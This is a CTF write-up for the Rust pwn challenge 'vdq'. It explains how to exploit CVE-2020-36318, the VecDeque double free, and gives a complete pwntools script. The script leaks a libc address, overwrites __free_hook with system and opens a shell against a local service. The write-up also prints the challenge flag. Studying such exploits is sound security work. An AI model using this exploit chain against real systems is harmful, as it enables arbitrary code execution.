# Pwn | vdq (2 solves)

## Description

Just a rust program

[Attachments](./to_player/)

## Solution

[CVE-2020-36318](https://www.cvedetails.com/cve/CVE-2020-36318/): Rust 1.48.0 VecDeque::make_contiguous() 存在double free漏洞。[最小demo](https://github.com/rust-lang/rust/issues/79808)

关键数据结构

```rust
struct Note {
    idx: Option<usize>, // + 0x00 Option/None, real usize
    msg: Vec<u8>,       // + 0x10 ptr cap len
}                       // + 0x28
```

利用思路：double free后利用Vec结构体中的ptr指针改`__free_hook`到`system`

```python
#!/usr/bin/python3

from pwn import *
context.arch='amd64'

p=remote('127.0.0.1',9999)

pay = '''[
    "Add", "Add", "Add", "Remove", "Remove", "Remove",
    "Add", "Add", "Remove", "Remove",
    "Add", "Add", "Remove", "Remove",
    "Add", "Add", "Add", "Add", "Remove", "Remove", "Remove", "Remove",

    "Add", "Add", "Add", "Add", "Add", "Add", "Add",
    "Remove", "View", "Remove", "Remove", "Remove", "Remove",
    "Archive", "Remove",
    "View",
    "Append",
    "Archive",
    "Append",
    "Add"
]
$'''

p.sendlineafter('!\n',pay)

for i in range(16-1):
    p.sendlineafter(': \n','')

p.sendlineafter(': \n','1'*0x410)
p.sendlineafter(': \n','')
p.sendlineafter(': \n','')

[p.recvuntil('Cached notes:\n') for i in range(2)]
[p.recvuntil(' -> ') for i in range(6)]

leak=0
for i in range(8):
    leak_byte=int(p.recvn(2),0x10)
    leak+=leak_byte<<(i*8)
base=leak-(0x7f57fd2b3ca0-0x7f57fcec8000)
p.success('base:'+hex(base))
__free_hook=base+0x7ff2888cb8e8-0x7ff2884de000
p.success('__free_hook:'+hex(__free_hook))
system=base+0x7ffff7617420-0x7ffff75c8000
p.success('system:'+hex(system))

p.sendlineafter(': \n',flat([0,0,__free_hook-0xa,0x3030303030303030]))
p.sendlineafter(': \n',p64(system))
p.sendlineafter(': \n','/bin/sh\0')
p.interactive()
```

## Flag

`HFCTF{Congrats!_You_are_really_a_master_of_Rust_v3dzPDa5isyoQCZEYG2OAnuLhlMXTjeHp1WtrBk80wqbJS7x}`

## Side Note

- vdq是VecDeque的缩写
- Rust [CVE-2020-36318](https://www.cvedetails.com/cve/CVE-2020-36318/) 利用的赛题首见于WMCTF2021中[M4tsuri师傅](https://github.com/M4tsuri)所设计的赛题`RuScheduler`
，随后在[Hack.lu CTF 2021](https://www.anquanke.com/post/id/258083#h3-2)也出现过。本题完全由WMCTF2021-RuScheduler改编而来，向原作者致敬。
- 本题二进制对应的[源代码](./source/src/main.rs)